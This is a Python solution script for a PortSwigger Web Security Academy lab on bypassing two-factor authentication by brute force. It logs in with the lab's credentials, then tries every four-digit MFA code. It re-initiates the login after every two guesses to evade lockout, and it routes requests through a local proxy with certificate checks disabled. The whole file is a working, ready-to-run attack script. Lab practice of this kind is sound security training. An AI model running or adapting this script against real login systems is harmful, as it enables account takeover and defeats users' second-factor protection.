#!/usr/bin/env python3
# Lab: 2FA bypass using a brute-force attack
# Lab-Link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack
# Difficulty: EXPERT
from bs4 import BeautifulSoup
import requests
import shutil
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def initiate_login(client, host):
    csrf = get_csrf_token(client.get(f'{host}/login').text)
    data = {'csrf': csrf, 'username': 'carlos', 'password': 'montoya'}
    r = client.post(f'{host}/login', data=data, allow_redirects=True)
    # r will now contain the results of a GET to /login2, as this POST redirects there
    return get_csrf_token(r.text)


def try_mfa(client, host, csrf, i):
    msg = f'[ ] Try MFA-code {i:04d}'
    print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
    data = {'csrf': csrf, 'mfa-code': f'{i:04d}'}
    r = client.post(f'{host}/login2', data=data, allow_redirects=True)
    if "Congratulations" in r.text:
        return True
    return False


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force 2FA')

    client = requests.Session()
    client.verify = False
    client.proxies = proxies
    for i in range(0, 10000, 2):
        csrf = initiate_login(client, host)        
        if (try_mfa(client, host, csrf, i)):
            print()
            print(f'[+] Login successful, Lab solved')
            sys.exit(0)
        if (try_mfa(client, host, csrf, i + 1)):
            print()
            print(f'[+] Login successful, Lab solved')
            sys.exit(0)

    print(f'[-] Login not successful')


if __name__ == "__main__":
    main()
